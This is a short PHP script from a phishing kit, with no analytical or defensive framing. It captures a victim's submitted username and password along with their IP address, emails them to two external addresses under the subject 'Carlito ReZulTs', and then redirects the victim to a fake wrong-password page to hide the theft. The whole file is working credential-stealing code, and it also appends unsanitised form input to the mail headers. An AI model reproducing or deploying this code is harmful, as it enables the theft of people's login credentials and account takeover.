<?
$ip = getenv("REMOTE_ADDR");
$message .= "-----------------Spam ReSulT--------------------\n";
$message .= "Username  : ".$_POST['j_username']."\n";
$message .= "Password : ".$_POST['j_password']."\n";
$message .= "----------------created by n0b0dy-------------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "-----------------Spam ReSulT--------------------\n";
$send = "jamespalbert1030yandex.com,millroll03@gmail.com";
$subject = "Carlito ReZulTs";
$headers = "From: ReZult<logzz@cok.edu>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send",$subject,$message,$headers);
?>
<script>
    window.top.location.href = "wrong-password.php";

</script>